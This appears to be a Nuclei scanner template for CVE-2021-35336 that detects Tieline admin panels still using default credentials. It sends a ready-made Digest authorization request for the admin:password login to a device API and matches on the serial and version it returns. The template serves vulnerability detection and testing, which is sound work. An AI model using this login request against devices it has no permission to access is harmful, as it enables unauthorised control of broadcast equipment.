id: CVE-2021-35336

info:
  name: Unauthorised Remote Access of Internal Panel
  author: Pratik Khalane
  severity: critical
  description: Finding the Tieline Admin Panels with default credentials.
  reference:
    - https://pratikkhalane91.medium.com/use-of-default-credentials-to-unauthorised-remote-access-of-internal-panel-of-tieline-c1ffe3b3757c
    - https://nvd.nist.gov/vuln/detail/CVE-2021-35336
  tags: cve,cve2021,tieline,default-login
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.80
    cve-id: CVE-2021-35336
    cwe-id: CWE-863

requests:
  - method: GET
    path:
      - '{{BaseURL}}/api/get_device_details'
    headers:
      Referer: '{{BaseURL}}/assets/base/home.html'
      Authorization: 'Digest username="admin", realm="Bridge-IT", nonce="d24d09512ebc3e43c4f6faf34fdb8c76", uri="/api/get_device_details", response="d052e9299debc7bd9cb8adef0a83fed4", qop=auth, nc=00000001, cnonce="ae373d748855243d"'
      # admin:password

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<SERIAL>"
          - "<VERSION>"
        condition: and

      - type: word
        words:
          - "text/xml"
        part: header

      - type: status
        status:
          - 200
